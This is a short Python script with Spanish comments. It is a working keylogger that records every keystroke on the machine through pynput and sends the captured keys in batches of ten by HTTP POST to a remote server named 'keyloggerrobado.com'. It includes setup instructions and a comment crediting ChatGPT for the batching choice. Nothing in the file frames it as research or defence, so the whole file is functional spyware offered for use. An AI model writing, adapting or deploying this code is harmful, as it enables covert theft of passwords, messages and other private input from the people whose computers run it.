import requests
from pynput import keyboard

#tienes que usar este comando primero para descargar las dependencias "pip install pynput requests"
#URL del server donde mandaremos y almacenaremos las pulsaciones de teclas
URL_SERVIDOR = 'https://keyloggerrobado.com'

#almacenamos las teclas pulsadas aqui
pulsaciones = []

#función para enviar las teclas al servidor remoto
def enviar_datos(data):
    try:
        #hacemos una peticion POST enviando las teclas
        response = requests.post(URL_SERVIDOR, data={'keystrokes': data})
        if response.status_code == 200:
            print("Datos enviados correctamente.")
        else:
            print(f"Error al mandar: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

#función que se ejecuta cada vez que se presiona una tecla
def pulsar(key):
    try:
        #con esto cogemos la tecla que es pulsada
        pulsaciones.append(key.char)
    except AttributeError:
        #si es una tecla especial (Shift, Ctrl, etc.)
        pulsaciones.append(f'<{key}>')

    #enviamos datos cada 10 teclas capturadas (esto me lo dijo el chatgpt está bien asi no mandamos cada tecla ni cada demasiadas por si acaso no llega)
    if len(pulsaciones) >= 10:
        datos = ''.join(str(p) for p in pulsaciones)
        enviar_datos(datos)
        pulsaciones.clear()

#ponemos a escuchar el teclado y hacemos que cada vez que se pulse una tecla se ejecute nuestra funcion pulsar
with keyboard.Listener(on_press=pulsar) as listener:
    listener.join()
